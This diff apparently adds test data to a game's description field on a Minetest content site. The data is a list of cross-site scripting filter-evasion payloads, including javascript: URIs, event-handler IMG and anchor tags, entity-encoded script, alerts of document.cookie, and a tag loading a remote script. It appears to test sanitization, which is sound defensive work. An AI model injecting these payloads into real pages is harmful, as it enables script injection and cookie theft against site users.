@@ -304,6 +304,38 @@ No warranty is provided, express or implied, for any part of the project.
 	game1.desc = """
 As seen on the Capture the Flag server (minetest.rubenwardy.com:30000)
 
+` `[`javascript:/*--></title></style></textarea></script></xmp><svg/onload='+/"/+/onmouseover=1/+/`](javascript:/*--%3E%3C/title%3E%3C/style%3E%3C/textarea%3E%3C/script%3E%3C/xmp%3E%3Csvg/onload='+/%22/+/onmouseover=1/+/)`[*/[]/+alert(1)//'>`
+
+<IMG SRC="javascript:alert('XSS');">
+
+<IMG SRC=javascript:alert(&amp;quot;XSS&amp;quot;)>
+
+``<IMG SRC=`javascript:alert("RSnake says, 'XSS'")`>``
+
+\<a onmouseover="alert(document.cookie)"\>xxs link\</a\>
+
+\<a onmouseover=alert(document.cookie)\>xxs link\</a\>
+
+<IMG SRC=javascript:alert(String.fromCharCode(88,83,83))>
+
+<script>alert("hello");</script>
+
+<SCRIPT SRC=`[`http://xss.rocks/xss.js></SCRIPT>`](http://xss.rocks/xss.js%3E%3C/SCRIPT%3E)`;`
+
+`<IMG \"\"\">`
+
+<SCRIPT>
+
+alert("XSS")
+
+</SCRIPT>
+
+<IMG SRC= onmouseover="alert('xxs')">
+
+<img src=x onerror="&#0000106&#0000097&#0000118&#0000097&#0000115&#0000099&#0000114&#0000105&#0000112&#0000116&#0000058&#0000097&#0000108&#0000101&#0000114&#0000116&#0000040&#0000039&#0000088&#0000083&#0000083&#0000039&#0000041">
+
+"\>
+
 Uses the CTF PvP Engine.
 """
 
